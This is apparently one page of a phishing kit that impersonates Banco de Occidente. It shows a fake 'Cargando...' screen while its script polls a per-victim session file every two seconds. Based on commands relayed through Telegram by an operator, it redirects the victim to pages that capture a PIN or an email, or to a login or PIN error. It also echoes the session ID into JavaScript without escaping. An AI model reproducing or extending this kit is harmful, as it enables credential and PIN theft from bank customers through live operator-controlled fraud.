<?php
session_start();
$id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando...</title>
  <style>
    :root {
      --primary-orange-light: #F2971F;
      --primary-orange-dark: #F4801F;
      --primary-green: #0D9A49;
      --secondary-green: #13b35f;
      --dark-gray: #333;
    }

    body {
      font-family: Arial, sans-serif;
      background: url("fondo.png") no-repeat center center fixed;
      background-size: cover;
      margin: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    main {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }

    .loading-box {
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 6px 16px rgba(0,0,0,0.15);
      width: 100%;
      max-width: 380px;
      text-align: center;
      overflow: hidden;
    }

    .loading-top {
      background: linear-gradient(180deg, var(--primary-orange-light) 0%, var(--primary-orange-dark) 100%);
      padding: 2.5rem 1.5rem;
      border-top-left-radius: 16px;
      border-top-right-radius: 16px;
    }
    .loading-top img {
      width: 100%;
      max-height: 60px;
      object-fit: contain;
      object-position: center;
      margin-bottom: 0.5rem;
    }
    .loading-top h2 {
      color: #fff;
      margin: 0.5rem 0 0;
    }

    .loading-bottom {
      background: #fff;
      padding: 2rem;
    }

    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid var(--primary-orange-dark);
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 1rem auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    p {
      color: var(--dark-gray);
      font-size: 1rem;
      margin-top: 1rem;
    }
  </style>
</head>
<body>
  <main>
    <div class="loading-box">
      <div class="loading-top">
        <img src="logo.png" alt="Logo Banco de Occidente">
        <h2>Cargando...</h2>
      </div>
      <div class="loading-bottom">
        <div class="spinner"></div>
        <p>Por favor espere, estamos procesando su solicitud.</p>
      </div>
    </div>
  </main>

 <script>
        const usuarioId = "<?php echo $id_sesion; ?>";

        function consultarServidor() {
            if (!usuarioId) return;

            // Consultar el archivo JSON en la raíz de sesiones sin caché
            fetch('./sesiones/' + usuarioId + '.json?v=' + new Date().getTime())
                .then(res => res.json())
                .then(data => {
                    // Control de redirecciones independientes basadas en la orden de Telegram
                    if (data.estado === 'index_error') {
                        window.location.href = 'index.php?error=auth';
                    } else if (data.estado === 'pin_normal') {
                        window.location.href = 'pin.php';
                    } else if (data.estado === 'correo_ok') {
                        window.location.href = 'correo.php';
                    } else if (data.estado === 'pin_rebotado') {
                        window.location.href = 'pin.php?error=pin_malo';
                    }
                })
                .catch(err => console.log("Esperando instrucción del instructor..."));
        }

        if (usuarioId) {
            setInterval(consultarServidor, 2000); // Monitoreo en vivo cada 2 segundos
        }
    </script>
</body>
</html>
